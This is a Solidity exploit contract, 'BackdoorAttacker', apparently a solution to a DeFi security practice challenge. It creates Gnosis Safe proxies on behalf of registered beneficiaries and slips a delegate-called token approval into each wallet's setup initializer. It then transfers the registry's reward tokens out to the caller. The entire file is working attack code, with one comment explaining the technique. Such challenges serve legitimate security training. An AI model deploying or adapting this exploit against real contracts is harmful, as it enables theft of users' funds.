// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

contract BackdoorAttacker
{
    IERC20 private immutable token;
    address private immutable walletFactory;
    address private immutable masterCopy;
    address private immutable registry;

    constructor(
        address _walletFactory,
        address _masterCopy,
        address _registry,
        address _tokenAddress
    ) {
        walletFactory = _walletFactory;
        masterCopy = _masterCopy;
        registry = _registry;
        token = IERC20(_tokenAddress);
    }

    function approveTokenSpend(address _spender) external {
        token.approve(_spender, token.balanceOf(registry));
    }

    function attack(address[] memory _beneficiaries) external {
        for (uint256 i = 0; i < _beneficiaries.length; i++) {
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = _beneficiaries[i];

            console.log("attack() - beneficiary = ", beneficiary[0]);
            // The proxy factory invokes an _initializer_ function after the proxy is created
            // and before it is returned. Therefore, if we approve ourselves to spend all the
            // tokens, we can simply transfer them to ourselves once we have the proxy address.
            bytes memory _initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector, beneficiary, 1, address(this),
                    abi.encodeWithSignature("approveTokenSpend(address)",
                    address(this)), address(0), 0, 0, 0
            );

            GnosisSafeProxy _newProxy = GnosisSafeProxyFactory(walletFactory)
                .createProxyWithCallback(
                    masterCopy, _initializer, i,
                    IProxyCreationCallback(registry)
            );

            address proxyAddress = address(_newProxy);
            console.log("attack() - \tproxyAddress = ", proxyAddress);
            token.transferFrom(proxyAddress, msg.sender, token.balanceOf(proxyAddress));
        }
    }
}